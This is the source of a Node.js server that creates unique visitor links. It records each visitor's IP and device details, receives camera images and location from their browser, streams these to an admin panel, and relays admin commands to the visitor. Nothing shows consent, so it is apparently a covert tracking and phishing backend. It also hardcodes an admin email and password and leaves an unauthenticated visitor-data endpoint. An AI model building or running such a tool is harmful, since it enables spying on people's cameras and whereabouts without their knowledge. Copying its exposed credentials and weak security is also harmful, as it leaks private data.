const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const bcrypt = require('bcryptjs');
const session = require('express-session');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use(session({
    secret: 'your-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

// Database setup
const DB_PATH = path.join(__dirname, 'database');
const USERS_FILE = path.join(DB_PATH, 'users.json');

if (!fs.existsSync(DB_PATH)) {
    fs.mkdirSync(DB_PATH);
}

if (!fs.existsSync(USERS_FILE)) {
    fs.writeFileSync(USERS_FILE, JSON.stringify([]));
}

// Helper functions
const readUsers = () => {
    try {
        const data = fs.readFileSync(USERS_FILE);
        return JSON.parse(data);
    } catch (error) {
        return [];
    }
};

const writeUsers = (users) => {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
};

// Store connected clients
const connectedClients = new Map();
const visitorData = new Map();

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/visitor/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'visitor.html'));
});

// Generate visitor link
app.post('/generate-link', (req, res) => {
    const visitorId = uuidv4();
    const link = `${req.protocol}://${req.get('host')}/visitor/${visitorId}`;
    
    // Store initial visitor data
    const visitorInfo = {
        id: visitorId,
        link: link,
        createdAt: new Date().toISOString(),
        status: 'pending'
    };
    
    const users = readUsers();
    users.push(visitorInfo);
    writeUsers(users);
    
    res.json({ success: true, link: link, visitorId: visitorId });
});

// Admin login
app.post('/admin-login', (req, res) => {
    const { email, password } = req.body;
    
    if (email === 'somuandsagar@gmail.com' && password === 'Somesh143x@4565') {
        req.session.admin = true;
        res.json({ success: true, message: 'Login successful' });
    } else {
        res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
});

// Get all visitors data
app.get('/api/visitors', (req, res) => {
    if (!req.session.admin) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    const users = readUsers();
    res.json(users);
});

// Get specific visitor data
app.get('/api/visitor/:id', (req, res) => {
    const users = readUsers();
    const visitor = users.find(u => u.id === req.params.id);
    if (visitor) {
        res.json(visitor);
    } else {
        res.status(404).json({ error: 'Visitor not found' });
    }
});

// Socket.io connection handling
io.on('connection', (socket) => {
    console.log('New client connected:', socket.id);
    
    socket.on('visitor-connect', (data) => {
        const { visitorId, userAgent, platform, screenResolution } = data;
        
        // Get IP address
        const ip = socket.handshake.address;
        
        // Get network info
        const networkInfo = {
            ip: ip,
            userAgent: userAgent,
            platform: platform,
            screenResolution: screenResolution
        };
        
        // Store visitor data
        const users = readUsers();
        const userIndex = users.findIndex(u => u.id === visitorId);
        
        if (userIndex !== -1) {
            users[userIndex] = {
                ...users[userIndex],
                ip: ip,
                deviceName: platform,
                networkName: userAgent,
                userAgent: userAgent,
                connected: true,
                socketId: socket.id,
                connectedAt: new Date().toISOString(),
                networkInfo: networkInfo
            };
            writeUsers(users);
            
            // Store in memory
            connectedClients.set(visitorId, socket.id);
            visitorData.set(visitorId, users[userIndex]);
            
            // Notify admin
            io.emit('visitor-connected', users[userIndex]);
        }
    });
    
    socket.on('visitor-data', (data) => {
        const { visitorId, type, content } = data;
        
        if (type === 'camera') {
            // Store camera data
            const users = readUsers();
            const userIndex = users.findIndex(u => u.id === visitorId);
            if (userIndex !== -1) {
                users[userIndex].cameraData = content;
                users[userIndex].lastCameraUpdate = new Date().toISOString();
                writeUsers(users);
                
                // Send to admin
                io.emit('camera-data', { visitorId, image: content });
            }
        } else if (type === 'location') {
            const users = readUsers();
            const userIndex = users.findIndex(u => u.id === visitorId);
            if (userIndex !== -1) {
                users[userIndex].location = content;
                users[userIndex].lastLocationUpdate = new Date().toISOString();
                writeUsers(users);
                
                // Send to admin
                io.emit('location-data', { visitorId, location: content });
            }
        }
    });
    
    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        
        // Update user status
        for (let [visitorId, socketId] of connectedClients) {
            if (socketId === socket.id) {
                const users = readUsers();
                const userIndex = users.findIndex(u => u.id === visitorId);
                if (userIndex !== -1) {
                    users[userIndex].connected = false;
                    users[userIndex].disconnectedAt = new Date().toISOString();
                    writeUsers(users);
                    
                    io.emit('visitor-disconnected', visitorId);
                }
                connectedClients.delete(visitorId);
                visitorData.delete(visitorId);
                break;
            }
        }
    });
    
    // Handle admin commands
    socket.on('admin-command', (data) => {
        const { visitorId, command } = data;
        const socketId = connectedClients.get(visitorId);
        
        if (socketId) {
            io.to(socketId).emit('admin-command', { command });
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`Admin panel: http://localhost:${PORT}/admin`);
});